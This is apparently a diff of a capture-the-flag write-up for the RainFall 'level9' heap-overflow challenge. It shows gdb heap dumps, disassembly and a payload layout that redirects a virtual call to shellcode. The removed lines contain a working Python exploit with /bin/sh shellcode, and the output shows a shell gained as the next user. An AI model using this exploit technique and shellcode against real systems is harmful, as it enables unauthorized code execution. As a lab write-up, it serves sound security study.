@@ -58,10 +58,11 @@ edx            0x804a008
 # declared on the heap.
 # The data type is as follows :
 
-struct s {
-	void *f;
+class N {
+	void *p;
 	char buf[104];
 	int	i;
+	...
 } => 4 + 104 + 4 = 112 bytes
 
 # We can see that it matches the size visible in the malloc header :
@@ -90,27 +91,49 @@ After memcpy(var1.buf, argv[1], strlen(argv[1]));
 (gdb) x/wx $esp+0x10
 0xbffff6e0:	0x0804a078
 
+0x804a070:	0x00000005	0x00000071	0x08048848	<== 0x00000000
+
 # Then the address now contained in $eax, which is basically the address of the
 # first member of the second object, is dereferenced twice.
-
-# We can put together a shellcode injection that will take care of this
-# subtlety. The payload will take the form :
+# Here we can exploit the fact that there is a call made with the address
+# stored at 0x804a078 to redirect the flow of execution of the program.
+# We can put together a shellcode injection that will use the following payload :
 
 [SHELLCODE_ADDR] [SHELLCODE] [PADDING] [ADDR_SHELLCODE_ADDR]
-0x804a010        ...         'AAA...'  0x804a00c
+	0x804a010        '...'    'AAA...'  	0x804a00c
+		|--------------^						|
+		^---------------------------------------|
 
-# The trick here is to have the address contained in the first member of the
-# second object point back to the beginning of the buffer contained in the
-# first object, then have this address point to the next word in the buffer.
+# This will be the state of the heap once the payload is loaded in memory :
 
-# This is the final payload :
+(gdb) x/60wx 0x804a000
+0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010<-
+				v------------------------------------|	   |
+0x804a010:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
+0x804a020:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
+0x804a030:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
+0x804a040:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
+0x804a050:	0xSSSSSSSS	0xAAAAAAAA	0xAAAAAAAA	0xAAAAAAAA |
+0x804a060:	0xAAAAAAAA	0xAAAAAAAA	0xAAAAAAAA	0xAAAAAAAA |
+0x804a070:	0xAAAAAAAA	0xAAAAAAAA	0x0804a00c	0x00000000 |
+										|------------------|
 
-level9@RainFall:~$ ./level9 `python -c "import struct;
-> addr1 = struct.pack('I', 0x804a010)
-> addr2 = struct.pack('I', 0x804a00c)
-> shellcode = str("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-"\x80\xe8\xdc\xff\xff\xff/bin/sh")
-> print addr1 + shellcode + 'A' * (104 - len(shellcode)) + addr2"`
+   0x0804867c <+136>:	mov    0x10(%esp),%eax <== $eax = var2;
+   0x08048680 <+140>:	mov    (%eax),%eax <== $eax = var2->p = 0x804a00c;
+   0x08048682 <+142>:	mov    (%eax),%edx <== $edx = *$eax = 0x804a010;
+
+# Then :
+
+   0x08048684 <+144>:	mov    0x14(%esp),%eax
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx <== (*0x0804a010)(var2, var1);
+
+# I'm not sure of the actual call being made here if there is no payload.
+
+# And finally :
+
+level9@RainFall:~$ ./level9 `python /tmp/payload.py`
 $ whoami
 bonus0
